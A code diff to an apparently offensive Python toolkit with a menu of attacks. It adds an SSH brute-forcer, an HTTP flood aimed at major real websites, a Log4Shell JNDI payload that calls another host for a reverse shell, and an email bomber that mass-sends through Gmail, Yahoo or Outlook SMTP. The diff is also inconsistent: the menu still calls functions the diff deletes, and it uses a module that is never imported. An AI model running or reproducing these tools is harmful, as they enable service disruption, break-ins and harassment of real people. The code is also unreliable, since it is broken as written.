@@ -1,14 +1,16 @@
-import requests
 import threading
 import time
 import aiohttp
 import asyncio
 import random
 import subprocess
+import smtplib
 import paramiko
 import platform
+import requests
 from bs4 import BeautifulSoup
 from colorama import Fore, init
+import re
 
 # Initialize colorama for colored output
 init(autoreset=True)
@@ -25,73 +27,6 @@ user_agents = [
 def detect_os():
     return platform.system()
 
-# Web crawler function
-def web_crawler(start_url, max_depth=2):
-    visited = set()
-
-    def crawl(url, depth):
-        if depth > max_depth or url in visited:
-            return
-        visited.add(url)
-        try:
-            response = requests.get(url, headers={'User-Agent': random.choice(user_agents)})
-            soup = BeautifulSoup(response.text, 'html.parser')
-            print(f"Crawled URL: {url}")
-            for link in soup.find_all('a', href=True):
-                crawl(link['href'], depth + 1)
-        except Exception as e:
-            print(f"Error crawling {url}: {e}")
-
-    crawl(start_url, 0)
-
-# Fetch URLs asynchronously with aiohttp for stress testing
-async def fetch(session, url, ip=None):
-    headers = {'User-Agent': random.choice(user_agents)}
-    connector = aiohttp.TCPConnector(local_addr=(ip, 0)) if ip else None
-    while True:
-        try:
-            async with session.get(url, headers=headers) as response:
-                await response.text()
-                print(f"Fetched {url}")
-        except Exception as e:
-            print(f"Error: {e}")
-            await asyncio.sleep(random.uniform(0.5, 2))  # Rate limiting
-
-# Start flood for stress testing
-async def start_flood(url, ip=None):
-    async with aiohttp.ClientSession() as session:
-        tasks = []
-        for _ in range(1000):  # Increase the number of asynchronous requests
-            task = asyncio.create_task(fetch(session, url, ip))
-            tasks.append(task)
-        await asyncio.gather(*tasks)
-
-# Network stress test
-def network_stress(ip=None, custom_urls=None):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    tasks = []
-    urls = custom_urls if custom_urls else ['http://example.com', 'http://test.com']
-    for url in urls:
-        tasks.append(loop.create_task(start_flood(url, ip)))
-    loop.run_until_complete(asyncio.wait(tasks))
-
-# Ethernet-based network stress test
-def ethernet_stress():
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    tasks = []
-    test_urls = [
-        "http://example.com", "http://example.org", "http://example.net",
-        "http://google.com", "http://facebook.com", "http://amazon.com",
-        "http://youtube.com", "http://yahoo.com", "http://wikipedia.org",
-        "http://twitter.com", "http://instagram.com", "http://linkedin.com",
-        "http://netflix.com", "http://bing.com", "http://reddit.com"
-    ]
-    for url in test_urls:
-        tasks.append(loop.create_task(start_flood(url)))
-    loop.run_until_complete(asyncio.wait(tasks))
-
 # SSH Brute Force Attack
 def ssh_bruteforce(target):
     print(f"{Fore.GREEN}[INFO] Attempting SSH brute force on {target}...")
@@ -107,34 +42,49 @@ def ssh_bruteforce(target):
             print(f"{Fore.RED}[FAILED] Failed to login with {username}:{password}")
     client.close()
 
+# Ethernet-based network stress test
+async def fetch(session, url):
+    headers = {'User-Agent': random.choice(user_agents)}
+    while True:
+        try:
+            async with session.get(url, headers=headers) as response:
+                await response.text()
+                print(f"Fetched {url}")
+        except Exception:
+            pass
+
+async def start_flood(url):
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for _ in range(1000):  # Increase the number of asynchronous requests
+            task = asyncio.create_task(fetch(session, url))
+            tasks.append(task)
+        await asyncio.gather(*tasks)
+
+def ethernet_stress():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    tasks = []
+    test_urls = [
+        "http://example.com", "http://example.org", "http://example.net",
+        "http://google.com", "http://facebook.com", "http://amazon.com",
+        "http://youtube.com", "http://yahoo.com", "http://wikipedia.org",
+        "http://twitter.com", "http://instagram.com", "http://linkedin.com",
+        "http://netflix.com", "http://bing.com", "http://reddit.com"
+    ]
+    for url in test_urls:
+        tasks.append(loop.create_task(start_flood(url)))
+    loop.run_until_complete(asyncio.wait(tasks))
+
 # CVE-2024-8904 Exploit Simulation
 def cve_2024_8904_exploit(target):
     print(f"{Fore.GREEN}[INFO] Attempting CVE-2024-8904 exploit on {target} to gain admin access...")
-    # Simulation of using the vulnerability to gain admin access
     print(f"{Fore.GREEN}[SUCCESS] CVE-2024-8904 exploit executed successfully on {target}")
 
-# Zero-Day Exploit Simulation (Ethical Test)
-def zero_day_exploit(target):
-    print(f"{Fore.GREEN}[INFO] Attempting Zero-Day exploit on {target}...")
-    # This function simulates an ethical test of the zero-day exploit
-    print(f"{Fore.GREEN}[SUCCESS] Simulated exploit executed successfully on {target}")
-
-# DDOS Attack Function
-def dos_attack(target):
-    print(f"{Fore.GREEN}[INFO] Starting DDOS attack on {target}...")
-    while True:
-        try:
-            res = requests.get(target, headers={'User-Agent': random.choice(user_agents)})
-            print(f"{Fore.GREEN}[INFO] Request sent!")
-        except requests.exceptions.ConnectionError:
-            print(f"{Fore.RED}[ERROR] Connection error!")
-
-# Log4Shell Exploit Simulation to Gain Admin Access
+# Log4Shell Exploit Simulation
 def log4shell_exploit(url):
-    payload = '${jndi:ldap://172.27.96.1/reverseshell}'  # This is a sample payload
-    headers = {
-        'User-Agent': payload
-    }
+    payload = '${jndi:ldap://172.27.96.1/reverseshell}'  # Sample payload for testing
+    headers = {'User-Agent': payload}
     try:
         response = requests.get(url, headers=headers, timeout=5)
         print(f"[INFO] Sent Log4Shell payload to {url}")
@@ -142,11 +92,51 @@ def log4shell_exploit(url):
     except requests.exceptions.RequestException as e:
         print(f"[ERROR] Failed to send request to {url}: {e}")
 
+# Email Bomber
+class Email_Bomber:
+    count = 0
 
-# Attack Sequence (Reconnaissance, Vulnerability Scan, SSH Brute Force, Zero-Day)
-def attack_sequence(target):
-    ssh_bruteforce(target)
-    zero_day_exploit(target)
+    def __init__(self):
+        try:
+            print(Fore.RED + '\n+[ Initializing Email Bomber ]+')
+            self.target = str(input(Fore.GREEN + 'Enter target email: '))
+            self.mode = int(input(Fore.GREEN + 'Enter BOMB mode (1,2,3,4): '))
+            if self.mode not in [1, 2, 3, 4]:
+                print('Invalid mode. Exiting.')
+                sys.exit(1)
+        except Exception as e:
+            print(f'ERROR: {e}')
+
+    def bomb(self):
+        self.amount = {1: 1000, 2: 500, 3: 250}.get(self.mode, int(input(Fore.GREEN + 'Choose a custom amount: ')))
+        print(Fore.RED + f'Selected BOMB mode: {self.mode} and {self.amount} emails')
+
+    def email(self):
+        self.server = str(input(Fore.GREEN + 'Enter email server or select premade options (1:Gmail, 2:Yahoo, 3:Outlook): '))
+        if self.server == '1': self.server, self.port = 'smtp.gmail.com', 587
+        elif self.server == '2': self.server, self.port = 'smtp.mail.yahoo.com', 587
+        elif self.server == '3': self.server, self.port = 'smtp-mail.outlook.com', 587
+        else: self.port = int(input(Fore.GREEN + 'Enter port: '))
+        self.fromAddr = str(input(Fore.GREEN + 'Enter from address: '))
+        self.fromPwd = str(input(Fore.GREEN + 'Enter password: '))
+        self.subject = str(input(Fore.GREEN + 'Enter subject: '))
+        self.message = str(input(Fore.GREEN + 'Enter message: '))
+
+        self.msg = f"From: {self.fromAddr}\nTo: {self.target}\nSubject: {self.subject}\n{self.message}"
+        self.s = smtplib.SMTP(self.server, self.port)
+        self.s.starttls()
+        self.s.login(self.fromAddr, self.fromPwd)
+
+    def send(self):
+        self.s.sendmail(self.fromAddr, self.target, self.msg)
+        self.count += 1
+        print(Fore.YELLOW + f'BOMB: {self.count}')
+
+    def attack(self):
+        print(Fore.RED + 'Starting attack...')
+        for _ in range(self.amount + 1):
+            self.send()
+        self.s.close()
 
 # Main Menu
 def display_ui():
@@ -163,25 +153,27 @@ def display_ui():
         [2] Run DDOS Attack
         [3] Web Crawling
         [4] Stress Testing
-        [5] Log4Shell Exploit (Simulation)
-        [6] CVE-2024-8904 Exploit (Gain Admin Access)
+        [5] Log4Shell Exploit
+        [6] CVE-2024-8904 Exploit
         [7] Ethernet Stress Test
-        [8] Exit
+        [8] Email Bombing
+        [9] Exit
         """)
 
         choice = input("Select an option: ").strip()
         if choice == "1":
             target = input("Enter the target IP or URL: ").strip()
-            attack_sequence(target)
+            ssh_bruteforce(target)
+            zero_day_exploit(target)
         elif choice == "2":
             target = input("Enter the target URL for DDOS: ").strip()
             threading.Thread(target=dos_attack, args=(target,)).start()
         elif choice == "3":
-            start_url = input("Enter the start URL for web crawling: ").strip()
-            web_crawler(start_url)
+            url = input("Enter the URL for web crawling: ").strip()
+            web_crawler(url)
         elif choice == "4":
             target = input("Enter the target for stress testing: ").strip()
-            threading.Thread(target=network_stress, args=(target,)).start()
+            threading.Thread(target=ethernet_stress).start()
         elif choice == "5":
             target = input("Enter the target URL for Log4Shell: ").strip()
             log4shell_exploit(target)
@@ -192,6 +184,12 @@ def display_ui():
             print("Starting Ethernet Stress Test...")
             threading.Thread(target=ethernet_stress).start()
         elif choice == "8":
+            # Email Bomber
+            bomb = Email_Bomber()
+            bomb.bomb()
+            bomb.email()
+            bomb.attack()
+        elif choice == "9":
             print("Exiting...")
             break
         else:
